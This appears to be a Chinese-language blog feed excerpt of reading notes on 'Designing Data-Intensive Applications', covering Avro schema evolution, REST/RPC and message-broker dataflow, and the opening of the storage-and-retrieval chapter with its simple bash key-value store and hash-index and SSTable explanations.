<p>只要 Avro 可以支持相应的类型转换，就可以改变字段的数据类型。更改字段的名称也是可能的，但有点棘手：Reader 模式可以包含字段名称的别名，所以它可以匹配旧 Writer 的模式字段名称与别名。这意味着更改字段名称是向后兼容的，但不能向前兼容。同样，向联合类型添加分支也是向后兼容的，但不能向前兼容。</p>
<ul>
<li>新 reader 可以通过别名映射读取旧 writer 的数据，所以向后兼容</li>
<li>新 writer 按新的 name 写，旧 reader 无法读取，所以不能向前兼容</li>
</ul>
<h4 id="reader-如何知道其-writer-模式">Reader 如何知道其 Writer 模式？</h4>
<p>对于一段特定的编码数据，Reader 如何知道其 Writer 模式？我们不能只将整个模式包括在每个记录中，因为模式可能比编码的数据大得多，从而使二进制编码节省的所有空间都是徒劳的。</p>
<p>答案取决于 Avro 使用的上下文。举几个例子：</p>
<ul>
<li><p>有很多记录的大文件</p>
<p>Avro 的一个常见用途 - 尤其是在 Hadoop 环境中 - 用于存储包含数百万条记录的大文件，所有记录都使用相同的模式进行编码。在这种情况下，可以在文件的开头只包含一次 Writer 模式。 Avro 指定了一个文件格式（对象容器文件）来做到这一点。</p></li>
<li><p>支持独立写入的记录的数据库</p>
<p>在一个数据库中，不同的记录可能会在不同的时间点使用不同的 Writer 模式来写入 - 你不能假定所有的记录都有相同的模式。最简单的解决方案是在每个编码记录的开始处包含一个版本号，并在数据库中保留一个模式版本列表。Reader 可以获取记录，提取版本号，然后从数据库中获取该版本号的 Writer 模式。使用该 Writer 模式，它可以解码记录的其余部分。</p></li>
<li><p>通过网络连接发送记录</p>
<p>当两个进程通过双向网络连接进行通信时，他们可以在连接设置上协商模式版本，然后在连接的生命周期中使用该模式。 Avro RPC 协议（请参阅 “<strong><a href="http://ddia.vonng.com/#/ch4?id=服务中的数据流：rest与rpc">服务中的数据流：REST 与 RPC</a></strong>”）就是这样工作的。</p></li>
</ul>
<p>具有模式版本的数据库在任何情况下都是非常有用的，因为它充当文档并为你提供了检查模式兼容性的机会【24】。作为版本号，你可以使用一个简单的递增整数，或者你可以使用模式的散列。</p>
<h4 id="动态生成的模式"><strong>动态生成的模式</strong></h4>
<p>与 Protocol Buffers 和 Thrift 相比，Avro 方法的一个优点是架构不包含任何标签号码。但为什么这很重要？在模式中保留一些数字有什么问题？</p>
<p>不同之处在于 Avro 对动态生成的模式更友善。例如，假如你有一个关系数据库，你想要把它的内容转储到一个文件中，并且你想使用二进制格式来避免前面提到的文本格式（JSON，CSV，SQL）的问题。如果你使用 Avro，你可以很容易地从关系模式生成一个 Avro 模式（在我们之前看到的 JSON 表示中），并使用该模式对数据库内容进行编码，并将其全部转储到 Avro 对象容器文件【25】中。你为每个数据库表生成一个记录模式，每个列成为该记录中的一个字段。数据库中的列名称映射到 Avro 中的字段名称。</p>
<p>现在，如果数据库模式发生变化（例如，一个表中添加了一列，删除了一列），则可以从更新的数据库模式生成新的 Avro 模式，并在新的 Avro 模式中导出数据。数据导出过程不需要注意模式的改变 - 每次运行时都可以简单地进行模式转换。任何读取新数据文件的人都会看到记录的字段已经改变，但是由于字段是通过名字来标识的，所以更新的 Writer 模式仍然可以与旧的 Reader 模式匹配。</p>
<p>相比之下，如果你为此使用 Thrift 或 Protocol Buffers，则字段标签可能必须手动分配：每次数据库模式更改时，管理员都必须手动更新从数据库列名到字段标签的映射（这可能会自动化，但模式生成器必须非常小心，不要分配以前使用的字段标签）。这种动态生成的模式根本不是 Thrift 或 Protocol Buffers 的设计目标，而是 Avro 的。</p>
<h4 id="代码生成和动态类型的语言"><strong>代码生成和动态类型的语言</strong></h4>
<p>Thrift 和 Protobuf 依赖于代码生成：在定义了模式之后，可以使用你选择的编程语言生成实现此模式的代码。这在 Java、C++ 或 C# 等静态类型语言中很有用，因为它允许将高效的内存中结构用于解码的数据，并且在编写访问数据结构的程序时允许在 IDE 中进行类型检查和自动补全。</p>
<p>在动态类型编程语言（如 JavaScript、Ruby 或 Python）中，生成代码没有太多意义，因为没有编译时类型检查器来满足。代码生成在这些语言中经常被忽视，因为它们避免了显式的编译步骤。而且，对于动态生成的模式（例如从数据库表生成的 Avro 模式），代码生成对获取数据是一个不必要的障碍。</p>
<p>Avro 为静态类型编程语言提供了可选的代码生成功能，但是它也可以在不生成任何代码的情况下使用。如果你有一个对象容器文件（它嵌入了 Writer 模式），你可以简单地使用 Avro 库打开它，并以与查看 JSON 文件相同的方式查看数据。该文件是自描述的，因为它包含所有必要的元数据。</p>
<p>这个属性特别适用于动态类型的数据处理语言如 Apache Pig 【26】。在 Pig 中，你可以打开一些 Avro 文件，开始分析它们，并编写派生数据集以 Avro 格式输出文件，而无需考虑模式。</p>
<h4 id="模式的优点"><strong>模式的优点</strong></h4>
<p>尽管 JSON、XML 和 CSV 等文本数据格式非常普遍，但基于模式的二进制编码也是一个可行的选择。</p>
<ul>
<li>它们可以比各种 “二进制 JSON” 变体更紧凑，因为它们可以省略编码数据中的字段名称。</li>
<li>模式是一种有价值的文档形式，因为模式是解码所必需的，所以可以确定它是最新的（而手动维护的文档可能很容易偏离现实）。</li>
<li>维护一个模式的数据库允许你在部署任何内容之前检查模式更改的向前和向后兼容性。</li>
<li>对于静态类型编程语言的用户来说，从模式生成代码的能力是有用的，因为它可以在编译时进行类型检查。</li>
</ul>
<p>总而言之，模式演化保持了与 JSON 数据库提供的无模式 / 读时模式相同的灵活性，同时还可以更好地保证你的数据并提供更好的工具。</p>
<h2 id="数据流的类型"><strong>数据流的类型</strong></h2>
<p>兼容性是编码数据的一个进程和解码它的另一个进程之间的一种关系。</p>
<p>数据可以通过多种方式从一个进程流向另一个进程。谁编码数据，谁解码？数据在进程之间流动的一些最常见的方式：</p>
<ul>
<li>数据库：
<ul>
<li>编码：写入数据库</li>
<li>解码：从数据库读取</li>
</ul></li>
<li>通过服务调用：
<ul>
<li>编码：client 编码 request，server 编码 response</li>
<li> 解码：client 解码 request，server 解码 response</li>
</ul></li>
<li> 通过异步消息传递
<ul>
<li>发送者编码，接受者解码</li>
</ul></li>
</ul>
<h3 id="数据库中的数据流"><strong>数据库中的数据流</strong></h3>
<p>一般来说，几个不同的进程同时访问数据库是很常见的。这些进程可能是几个不同的应用程序或服务，或者它们可能只是几个相同服务的实例（为了可伸缩性或容错性而并行运行）。无论哪种方式，在应用程序发生变化的环境中，访问数据库的某些进程可能会运行较新的代码，有些进程可能会运行较旧的代码，例如，新版本当前正在部署滚动升级，有些实例已经更新，而其他实例尚未更新。</p>
<p>前后兼容性：</p>
<ul>
<li>向前兼容：数据库中的一个旧值可能会被新版本的代码读取。</li>
<li>向后兼容：数据库中的一个新代码写入的值会被旧版本的代码读取。</li>
</ul>
<p>还需要注意：新增字段并写入值，旧代码读取记录并更新写回时，需要保持新的字段不变，即使它不能被解释。</p>
<p>前面讨论的编码格式支持未知字段的保存，但是有时候需要在应用程序层面保持谨慎了，避免未知字段在该翻译过程中丢失。</p>
<h4 id="在不同的时间写入不同的值"><strong>在不同的时间写入不同的值</strong></h4>
<p>数据库通常允许任何时候更新任何值。这意味着在一个单一的数据库中，可能有一些值是五毫秒前写的，而一些值是五年前写的。</p>
<p>在部署应用程序的新版本时，也许用不了几分钟就可以将所有的旧版本替换为新版本（至少服务器端应用程序是这样的）。但数据库内容并非如此：对于五年前的数据来说，除非对其进行显式重写，否则它仍然会以原始编码形式存在。这种现象有时被概括为：数据的生命周期超出代码的生命周期。</p>
<p>将数据重写（迁移）到一个新的模式当然是可能的，但是在一个大数据集上执行是一个昂贵的事情，所以大多数数据库如果可能的话就避免它。大多数关系数据库都允许简单的模式更改，例如添加一个默认值为空的新列，而不重写现有数据 (除了 MySQL，即使并非真的必要，它也经常会重写整个表，正如 “<strong><a href="http://ddia.vonng.com/#/ch2?id=文档模型中的模式灵活性">文档模型中的模式灵活性</a></strong>” 中所提到的。)。读取旧行时，对于磁盘上的编码数据缺少的任何列，数据库将填充空值。 LinkedIn 的文档数据库 Espresso 使用 Avro 存储，允许它使用 Avro 的模式演变规则【23】。</p>
<p>因此，模式演变允许整个数据库看起来好像是用单个模式编码的，即使底层存储可能包含用各种历史版本的模式编码的记录。</p>
<h4 id="归档存储"><strong>归档存储</strong></h4>
<p>也许你不时为数据库创建一个快照，例如备份或加载到数据仓库。在这种情况下，即使源数据库中的原始编码包含来自不同时代的模式版本的混合，数据转储通常也将使用最新模式进行编码。既然你不管怎样都要拷贝数据，那么你可以对这个数据拷贝进行一致的编码。</p>
<p>由于数据转储是一次写入的，而且以后是不可变的，所以 Avro 对象容器文件等格式非常适合。这也是一个很好的机会，可以将数据编码为面向分析的列式格式，例如 Parquet（请参阅 “<strong><a href="http://ddia.vonng.com/#/ch3?id=列压缩">列压缩</a></strong>”）。</p>
<h3 id="服务中的数据流rest与rpc"><strong>服务中的数据流：REST 与 RPC</strong></h3>
<p>最常见的网络进程通信方式，有两个角色：客户端和服务器。服务器通过网络公开 API，客户端可以连接到服务器以向该 API 发出请求。服务器公开的 API 被称为服务（service）。</p>
<ul>
<li>客户端：Web 浏览器、移动设备的本地应用程序等。</li>
<li>服务器：响应客户端请求的应用程序</li>
</ul>
<p>服务器本身可以是另一个服务的客户端（例如，典型的 Web 应用服务器充当数据库的客户端）。这种方法通常用于将大型应用程序按照功能区域分解为较小的服务，这样当一个服务需要来自另一个服务的某些功能或数据时，就会向另一个服务发出请求。这种构建应用程序的方式传统上被称为 <strong>面向服务的体系结构（service-oriented architecture，SOA）</strong>，最近被改进和更名为 <strong>微服务架构（*<em>microservices architecture*</em>）</strong>。</p>
<p>在某些方面，服务类似于数据库：它们通常允许客户端提交和查询数据。但是，虽然数据库允许使用我们在 <strong>第二章</strong> 中讨论的查询语言进行任意查询，但是服务公开了一个特定于应用程序的 API，它只允许由服务的业务逻辑（应用程序代码）预定的输入和输出【33】。这种限制提供了一定程度的封装：服务能够对客户可以做什么和不可以做什么施加细粒度的限制。</p>
<p>微服务架构的一个关键设计目标是，通过服务独立部署和演化来使应用程序更易于更改和维护。例如，每个服务应该由一个团队拥有，并且该团队应该能够经常发布新版本的服务，而不必与其他团队协调。换句话说，我们应该期望服务器和客户端的旧版本和新版本同时运行，因此服务器和客户端使用的数据编码必须在不同版本的服务 API 之间兼容。</p>
<h4 id="web服务"><strong>Web 服务</strong></h4>
<p><strong>当服务使用 HTTP 作为底层通信协议时，可称之为 Web 服务</strong>。这可能是一个小错误，因为 Web 服务不仅在 Web 上使用，而且在几个不同的环境中使用。例如：</p>
<ol type="1">
<li>运行在用户设备上的客户端应用程序通过 HTTP 向服务发出请求，通常通过公共互联网。</li>
<li>同组织内，服务另一服务发起请求，这些服务通常位于同一数据中心内，作为微服务架构的一部分。 （支持这种用例的软件有时被称为 <strong>中间件（middleware）</strong> ）</li>
<li>服务向不同组织所拥有的服务发起请求，用于不同组织后端系统之间的数据交换。此类别包括由在线服务（如信用卡处理系统）提供的公共 API，或用于共享访问用户数据的 OAuth。</li>
</ol>
<p>有两种流行的 Web 服务方法：REST 和 SOAP。他们在设计哲学方面几乎是截然相反的。</p>
<p>REST 不是一个协议，而是一个基于 HTTP 原则的设计哲学【34,35】。它强调简单的数据格式，使用 URL 来标识资源，并使用 HTTP 功能进行缓存控制，身份验证和内容类型协商。与 SOAP 相比，REST 已经越来越受欢迎。根据 REST 原则设计的 API 称为 RESTful</p>
<p>REST 风格的 API 倾向于更简单的方法，通常涉及较少代码生成和自动化工具。定义格式（如 OpenAPI，也称为 Swagger 【40】）可用于描述 RESTful API 并生成文档。</p>
<h4 id="远程过程调用rpc的问题"><strong>远程过程调用（RPC）的问题</strong></h4>
<p>Web 服务仅仅是通过网络进行 API 请求的一系列技术的最新版本，其中许多技术受到了大量的炒作，但是存在严重的问题。 Enterprise JavaBeans（EJB）和 Java 的 <strong>远程方法调用（RMI）</strong> 仅限于 Java。<strong>分布式组件对象模型（DCOM）</strong> 仅限于 Microsoft 平台。<strong>公共对象请求代理体系结构（CORBA）</strong> 过于复杂，不提供前向或后向兼容性【41】。</p>
<p>所有这些都是基于 <strong>远程过程调用（RPC）</strong> 的思想，该过程调用自 20 世纪 70 年代以来一直存在【42】。 RPC 模型试图向远程网络服务发出请求，看起来与在同一进程中调用编程语言中的函数或方法相同，这种抽象被称为位置透明（location transparency）。尽管 RPC 起初看起来很方便，但这种方法根本上是有缺陷的【43,44】。网络请求与本地函数调用非常不同：</p>
<ul>
<li>本地函数调用是可预测的，并且成功或失败仅取决于受你控制的参数。网络请求是不可预测的：请求或响应可能由于网络问题会丢失，或者远程计算机可能很慢或不可用，这些问题完全不在你的控制范围之内。网络问题很常见，因此必须有所准备，例如重试失败的请求。</li>
<li>本地函数调用要么返回结果，要么抛出异常，或者永远不返回（因为进入无限循环或进程崩溃）。网络请求有另一个可能的结果：由于超时，它返回时可能没有结果。在这种情况下，你根本不知道发生了什么：如果你没有得到来自远程服务的响应，你无法知道请求是否通过（我们将在 <strong><a href="http://ddia.vonng.com/#/ch8">第八章</a></strong> 更详细地讨论这个问题）。</li>
<li>如果你重试失败的网络请求，可能会发生请求实际上已经完成，只是响应丢失的情况。在这种情况下，重试将导致该操作被执行多次，除非你在协议中建立数据去重机制（<strong>幂等性</strong>，即 idempotence）。本地函数调用时没有这样的问题。 （在 <strong><a href="http://ddia.vonng.com/#/ch11">第十一章</a></strong> 更详细地讨论幂等性）</li>
<li>每次调用本地函数时，通常需要大致相同的时间来执行。网络请求比函数调用要慢得多，而且其延迟也是非常可变的：好的时候它可能会在不到一毫秒的时间内完成，但是当网络拥塞或者远程服务超载时，可能需要几秒钟的时间才能完成相同的操作。</li>
<li>调用本地函数时，可以高效地将引用（指针）传递给本地内存中的对象。当你发出一个网络请求时，所有这些参数都需要被编码成可以通过网络发送的一系列字节。如果参数是像数字或字符串这样的基本类型倒是没关系，但是对于较大的对象很快就会出现问题。</li>
<li>客户端和服务可以用不同的编程语言实现，所以 RPC 框架必须将数据类型从一种语言翻译成另一种语言。这可能会变得很丑陋，因为不是所有的语言都具有相同的类型 —— 例如 JavaScript 的数字大于 2^53 的问题。用单一语言编写的单个进程中不存在此问题。</li>
</ul>
<p>所有这些因素意味着尝试使远程服务看起来像编程语言中的本地对象一样毫无意义，因为这是一个根本不同的事情。 REST 的部分吸引力在于，它并不试图隐藏它是一个网络协议的事实（尽管这似乎并没有阻止人们在 REST 之上构建 RPC 库）。</p>
<h4 id="rpc的当前方向"><strong>RPC 的当前方向</strong></h4>
<p>尽管有这样那样的问题，RPC 不会消失。在本章提到的所有编码的基础上构建了各种 RPC 框架：例如，Thrift 和 Avro 带有 RPC 支持，gRPC 是使用 Protocol Buffers 的 RPC 实现，Finagle 也使用 Thrift，<a href="http://Rest.li">Rest.li</a> 使用 JSON over HTTP。</p>
<p>这种新一代的 RPC 框架更加明确的是，远程请求与本地函数调用不同。例如：</p>
<ul>
<li>Finagle 和 <a href="http://Rest.li">Rest.li</a> 使用 futures（promises）来封装可能失败的异步操作。<code>Futures</code> 还可以简化需要并行发出多项服务并将其结果合并的情况【45】。</li>
<li>gRPC 支持流，其中一个调用不仅包括一个请求和一个响应，还可以是随时间的一系列请求和响应【46】。</li>
</ul>
<p>其中一些框架还提供服务发现，即允许客户端找出在哪个 IP 地址和端口号上可以找到特定的服务。我们将在 “<strong><a href="http://ddia.vonng.com/#/ch6?id=请求路由">请求路由</a></strong>” 中回到这个主题。</p>
<p>使用二进制编码格式的自定义 RPC 协议可以实现比通用的 JSON over REST 更好的性能。但是，RESTful API 还有其他一些显著的优点：方便实验和调试（只需使用 Web 浏览器或命令行工具 curl，无需任何代码生成或软件安装即可向其请求），能被所有主流的编程语言和平台所支持，还有大量可用的工具（服务器，缓存，负载平衡器，代理，防火墙，监控，调试工具，测试工具等）的生态系统。</p>
<p>由于这些原因，REST 似乎是公共 API 的主要风格。 RPC 框架的主要重点在于同一组织拥有的服务之间的请求，通常在同一数据中心内。</p>
<h4 id="数据编码与rpc的演化"><strong>数据编码与 RPC 的演化</strong></h4>
<p>对于可演化性，重要的是可以独立更改和部署 RPC 客户端和服务器。与通过数据库流动的数据相比（如上一节所述），我们可以在通过服务进行数据流的情况下做一个简化的假设：假定所有的服务器都会先更新，其次是所有的客户端。因此，你只需要在请求上具有向后兼容性，并且对响应具有前向兼容性。</p>
<p>RPC 方案的前后向兼容性属性从它使用的编码方式中继承：</p>
<ul>
<li>Thrift、gRPC（Protobuf）和 Avro RPC 可以根据相应编码格式的兼容性规则进行演变。</li>
<li>在 SOAP 中，请求和响应是使用 XML 模式指定的。这些可以演变，但有一些微妙的陷阱【47】。</li>
<li>RESTful API 通常使用 JSON（没有正式指定的模式）用于响应，以及用于请求的 JSON 或 URI 编码 / 表单编码的请求参数。添加可选的请求参数并向响应对象添加新的字段通常被认为是保持兼容性的改变。</li>
</ul>
<p>由于 RPC 经常被用于跨越组织边界的通信，所以服务的兼容性变得更加困难，因此服务的提供者经常无法控制其客户，也不能强迫他们升级。因此，需要长期保持兼容性，也许是无限期的。如果需要进行兼容性更改，则服务提供商通常会并排维护多个版本的服务 API。</p>
<p>关于 API 版本化应该如何工作（即，客户端如何指示它想要使用哪个版本的 API）没有一致意见【48】）。对于 RESTful API，常用的方法是在 URL 或 HTTP Accept 头中使用版本号。对于使用 API 密钥来标识特定客户端的服务，另一种选择是将客户端请求的 API 版本存储在服务器上，并允许通过单独的管理界面更新该版本选项【49】。</p>
<h3 id="消息传递中的数据流"><strong>消息传递中的数据流</strong></h3>
<p>异步消息传递系统 RPC 类似，客户端的请求（通常称为消息）以低延迟传送到另一个进程。它们也与数据库类似，但不是通过直接的网络连接发送消息，而是通过称为消息代理（message broker），也称为消息队列（message queue）或面向消息的中间件（message-oriented middleware）的中介来临时存储消息。</p>
<p>与直接 RPC 相比，使用消息代理有几个优点：</p>
<ul>
<li>如果收件人不可用或过载，可以充当缓冲区，从而提高系统的可靠性。</li>
<li>它可以自动将消息重新发送到已经崩溃的进程，从而防止消息丢失。</li>
<li>避免发件人需要知道收件人的 IP 地址和端口号（这在虚拟机经常出入的云部署中特别有用）。</li>
<li>它允许将一条消息发送给多个收件人。</li>
<li>将发件人与收件人逻辑分离（发件人只是发布邮件，不关心使用者）。</li>
</ul>
<p>然而，与 RPC 相比，消息传递通信通常是单向的：发送者通常不期望收到其消息的回复。虽然也可以构建另一个通道来发送接收响应，但这种通信模式是异步的：发送者不会等待消息被传递，而只是发送它，然后忘记它。</p>
<h4 id="消息代理"><strong>消息代理</strong></h4>
<p>过去，<strong>消息代理（Message Broker）</strong> 主要是 TIBCO、IBM WebSphere 和 webMethods 等公司的商业软件的秀场。最近像 RabbitMQ、ActiveMQ、HornetQ、NATS 和 Apache Kafka 这样的开源实现已经流行起来。</p>
<p>详细的交付语义因实现和配置而异，但通常情况下，消息代理的使用方式如下：一个进程将消息发送到指定的队列或主题（topic），代理确保将消息传递给那个队列或主题的一个或多个消费者或订阅者。在同一主题上可以有许多生产者和许多消费者。</p>
<p>一个主题只提供单向数据流。但是，消费者本身可能会将消息发布到另一个主题上（因此，可以将它们链接在一起，就像我们将在 <strong><a href="http://ddia.vonng.com/#/ch11">第十一章</a></strong> 中看到的那样），或者发送给原始消息的发送者使用的回复队列（允许请求 / 响应数据流，类似于 RPC）。</p>
<p>消息代理通常不会执行任何特定的数据模型 —— 消息只是包含一些元数据的字节序列，因此你可以使用任何编码格式。如果编码是向后和向前兼容的，你可以灵活地对发布者和消费者的编码进行独立的修改，并以任意顺序进行部署。</p>
<p>如果消费者重新发布消息到另一个主题，则可能需要小心保留未知字段，以防止前面在数据库环境中描述的问题</p>
<h4 id="分布式的actor框架"><strong>分布式的 Actor 框架</strong></h4>
<p>Actor 模型是单个进程中并发的编程模型。逻辑被封装在 actor 中，而不是直接处理线程（以及竞争条件、锁定和死锁的相关问题）。每个 actor 通常代表一个客户或实体，它可能有一些本地状态（不与其他任何角色共享），它通过发送和接收异步消息与其他角色通信。不保证消息传送：在某些错误情况下，消息将丢失。由于每个角色一次只能处理一条消息，因此不需要担心线程，每个角色可以由框架独立调度。</p>
<p>在分布式 Actor 框架中，此编程模型用于跨多个节点伸缩应用程序。不管发送方和接收方是在同一个节点上还是在不同的节点上，都使用相同的消息传递机制。如果它们在不同的节点上，则该消息被透明地编码成字节序列，通过网络发送，并在另一侧解码。</p>
<p>位置透明在 actor 模型中比在 RPC 中效果更好，因为 actor 模型已经假定消息可能会丢失，即使在单个进程中也是如此。尽管网络上的延迟可能比同一个进程中的延迟更高，但是在使用 actor 模型时，本地和远程通信之间的基本不匹配是较少的。</p>
<p>分布式的 Actor 框架实质上是将消息代理和 actor 编程模型集成到一个框架中。但是，如果要执行基于 actor 的应用程序的滚动升级，则仍然需要担心向前和向后兼容性问题，因为消息可能会从运行新版本的节点发送到运行旧版本的节点，反之亦然。</p>
<p>三个流行的分布式 actor 框架处理消息编码如下：</p>
<ul>
<li>默认情况下，Akka 使用 Java 的内置序列化，不提供前向或后向兼容性。 但是，你可以用类似 Prototol Buffers 的东西替代它，从而获得滚动升级的能力【50】。</li>
<li>Orleans 默认使用不支持滚动升级部署的自定义数据编码格式；要部署新版本的应用程序，你需要设置一个新的集群，将流量从旧集群迁移到新集群，然后关闭旧集群【51,52】。 像 Akka 一样，可以使用自定义序列化插件。</li>
<li>在 Erlang OTP 中，对记录模式进行更改是非常困难的（尽管系统具有许多为高可用性设计的功能）。 滚动升级是可能的，但需要仔细计划【53】。 一个新的实验性的 <code>maps</code> 数据类型（2014 年在 Erlang R17 中引入的类似于 JSON 的结构）可能使得这个数据类型在未来更容易【54】。</li>
</ul>
<h2 id="本章小结"><strong>本章小结</strong></h2>
<p>本章研究了将数据结构转换为网络中的字节或磁盘上的字节的几种方法，这些编码的细节不仅影响其效率，更重要的是也影响了应用程序的体系结构和部署它们的选项。</p>
<p>特别是，许多服务需要支持滚动升级，其中新版本的服务逐步部署到少数节点，而不是同时部署到所有节点。滚动升级允许在不停机的情况下发布新版本的服务（从而鼓励在罕见的大型版本上频繁发布小型版本），并使部署风险降低（允许在影响大量用户之前检测并回滚有故障的版本）。这些属性对于可演化性，以及对应用程序进行更改的容易性都是非常有利的。</p>
<p>在滚动升级期间，或出于各种其他原因，我们必须假设不同的节点正在运行我们的应用程序代码的不同版本。因此，在系统周围流动的所有数据都是以提供向后兼容性（新代码可以读取旧数据）和向前兼容性（旧代码可以读取新数据）的方式进行编码是重要的。</p>
<p>几种数据编码格式及其兼容性属性：</p>
<ul>
<li>编程语言特定的编码仅限于单一编程语言，并且往往无法提供前向和后向兼容性。</li>
<li>JSON、XML 和 CSV 等文本格式非常普遍，其兼容性取决于你如何使用它们。他们有可选的模式语言，这有时是有用的，有时是一个障碍。这些格式对于数据类型有些模糊，所以你必须小心数字和二进制字符串。</li>
<li>像 Thrift、Protocol Buffers 和 Avro 这样的二进制模式驱动格式允许使用清晰定义的前向和后向兼容性语义进行紧凑，高效的编码。这些模式可以用于静态类型语言的文档和代码生成。但是，他们有一个缺点，就是在数据可读之前需要对数据进行解码。</li>
</ul>
<p>本章讨论了数据流的几种模式，说明了数据编码重要性的不同场景：</p>
<ul>
<li>数据库，写入数据库的进程对数据进行编码，并从数据库读取进程对其进行解码</li>
<li> RPC 和 REST API，客户端对请求进行编码，服务器对请求进行解码并对响应进行编码，客户端最终对响应进行解码</li>
<li>异步消息传递（使用消息代理或参与者），其中节点之间通过发送消息进行通信，消息由发送者编码并由接收者解码</li>
</ul>
<p>我们可以小心地得出这样的结论：前向兼容性和滚动升级在某种程度上是可以实现的。愿你的应用程序的演变迅速、敏捷部署。</p>
<h2 id="参考">参考</h2>
<ul>
<li><a href="http://ddia.vonng.com/#/ch4">第四章：编码与演化 (vonng.com)</a></li>
</ul>
]]></content>
      <categories>
        <category>阅读</category>
        <category>后端</category>
        <category>DDIA</category>
      </categories>
      <tags>
        <tag>DDIA</tag>
        <tag>设计数据密集型应用</tag>
      </tags>
  </entry>
  <entry>
    <title>DDIA 阅读笔记第三章：存储与检索</title>
    <url>/blog/2024/04/30/DDIA-Note-3/</url>
    <content><![CDATA[<h2 id="摘要">摘要</h2>
<p>本章主要介绍了数据库的索引结构及原理，并讨论了 OLTP 和 OLAP 数据库的不同。前半部分是摘抄笔记的形式，后半部分的讨论比较宽泛，直接摘抄原文高亮重点了。</p>
<span id="more"></span>
<p>数据库的基础功能：</p>
<ul>
<li>写入：把数据保存起来</li>
<li>读取：返回保存的数据</li>
</ul>
<p>应用开发者一般不需要过度关注数据库的底层原理，但当需要数据库选型时，只有了解数据引擎的特点及优劣，才能选择出对负载友好的数据引擎。例如事务型（transactional）和分析型（analystics）的负载，适合的数据引擎会有较大差异。</p>
<p>本章研究两大类存储引擎：<strong>日志结构（log-structured）</strong> 的存储引擎，以及<strong>面向页面（page-oriented）</strong> 的存储引擎（例如 B 树）。</p>
<h2 id="驱动数据库的数据结构"><strong>驱动数据库的数据结构</strong></h2>
<p>一个简单的 kv 数据库可以用 bash 函数实现：</p>
<figure class="highlight bash"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">##!/bin/bash</span></span><br><span class="line"><span class="function"><span class="title">db_set</span></span> () {</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">"<span class="variable">$1</span>,<span class="variable">$2</span>"</span> &gt;&gt; database</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">db_get</span></span> () {</span><br><span class="line">    grep <span class="string">"^<span class="variable">$1</span>,"</span> database | sed -e <span class="string">"s/^<span class="variable">$1</span>,//"</span> | tail -n 1</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<p>原理是维护一个只追加的日志文件。其中，db_set 追加新的 kv 对，db_get 从日志文件中检索 key 所对应的最新 value。该实现中：</p>
<ul>
<li>写是非常高效的。因为磁盘的顺序写入速度远超随机写入。</li>
<li>读非常低效，最坏 O (n) 复杂度，n 为记录条数。</li>
</ul>
<p>日志的含义：并不狭义指代人类可读的应用日志。在本书中，指代的是顺序写入的记录、不一定人类可读，有可能是二进制的格式，用于其他程序分析。</p>
<ul>
<li>许多数据库在内部使用了<strong>日志（log）</strong>，也就是一个 <strong>仅追加（append-only）</strong> 的数据文件，但会考虑并发控制，以及回收磁盘空间，避免日志无限增长。</li>
</ul>
<p>为了提高读的效率，需要添加索引。索引是源于存储数据本身的额外数据：</p>
<ul>
<li>索引的增删不改变数据本身</li>
<li>增加索引可以优化检索效率</li>
<li>增加索引会带来维护索引的写开销</li>
<li>应用往往需要根据查询模式，建立合适的索引，达到成本 - 收益的 trade-of</li>
</ul>
<h3 id="哈希索引">哈希索引</h3>
<p>在内存中维护 key-value 磁盘偏移的映射关系，如下图所示。</p>
<p><img src="fig3-1.png"></p>
<p>读取时，先读取 key 对应的最新 value 的 offset，再在磁盘中读取 value。写入时，新建记录，更新 offset。</p>
<ul>
<li>Bitcask 就是这么做的，可以提供高效的读写，但要求所有的 key 必须能够保存在内存中</li>
<li>适用于 key 少，值经常更新的场景</li>
<li>读取时，如果页面在缓存中，不需要磁盘 io</li>
</ul>
<h4 id="压缩与合并">压缩与合并</h4>
<p>为了避免日志文件无限增长，做法把日志分为多个<strong>不可变的段</strong>，是当日志文件到达指定大小后，新建日志文件，并对已有的日志进行压缩与合并：</p>
<ul>
<li>压缩（compaction）：将一个日志内的重复 key-value 合并，只保留最新的 value</li>
<li> 合并（merge）：将压缩后的多个小日志段合并
<ul>
<li>合并是写入一个新的段，而不是修改已有的段</li>
</ul></li>
</ul>
<p><img src="fig3-3.png"></p>
<p>每个段需要维护一个 hash 表，当查找一个 key 时，从最新的段开始，逐个查询是否存在对应的 value offset。</p>
<h4 id="亟待解决的问题">亟待解决的问题</h4>
<p>为了构建一个更实用的实现，还需要关心的问题：</p>
<ul>
<li>文件格式：CSV 存储日志低效，使用二进制存储会更加高效</li>
<li>删除 key：需要增加一条删除记录（tombstone，墓碑），用于在 merge 时标识丢弃所有 k-v 对</li>
<li>故障恢复：如果数据库宕机，内存里的 hash 索引会丢失。虽然可以通过逐行扫描重建索引，但开销太大。Bitcask 将每个段的 hash 存储到了磁盘里，可以重启时快速加载到内存。</li>
<li>部分写入：数据库可能在任意时刻宕机，可能出现记录部分写入的情况。Bitcask 通过校验和机制检测部分写入的情况。</li>
<li>并发控制：由于写操作是以严格顺序的顺序附加到日志中的，所以常见的实现选择是只有一个写入器线程。数据文件段是附加的，或者是不可变的，所以它们可以被多个线程同时读取。</li>
</ul>
<p>虽然追加写入看起来比覆盖旧值更浪费空间，但是：</p>
<ul>
<li>追加写入是顺序写，性能通常大幅快于随机写入</li>
<li>覆盖旧值可能出现部分新、部分旧值的棘手情况，追加写入则不会</li>
<li>段旧的压缩和融合避免了段的数量和空间随着时间持续增加</li>
</ul>
<h4 id="缺点">缺点</h4>
<ul>
<li>hash 表必须能够完全容纳在内存中。如果 hash 表存到磁盘里，随机读效率会非常低下。</li>
<li>不支持顺序遍历，例如不能遍历 kitty00000 到 kitty99999 中间的所有 key。</li>
</ul>
<h3 id="sstables与lsm-树">SSTables 与 LSM 树</h3>
<p>在上面的段中，段内 key 无序存储，这不仅限制了顺序遍历，也给 merge 带来了开销。</p>
<p>排序字符串表（Sort String Tables，SSTables）是对上述格式的改进，要求：</p>
<ul>
<li>段内键值对的序列按键排序</li>
<li> merge 完成的段内不能包含重复 key（压缩操作已经实现了）</li>
</ul>
<p>虽然 SSTables 看起来违反了只追加的特性，但后文再涉及这一方面。</p>
<p>相较于之前的无序段，SSTables 有以下优点：</p>
<ul>
<li><p>merge 更加简单高效。有序段 merge 过程类似归并排序，只不过是新段的值优先级更高。即使段大小超出了可用内存，也可以处理。合并完的段也天然有序。</p>
<p><img src="fig3-4.png"></p></li>
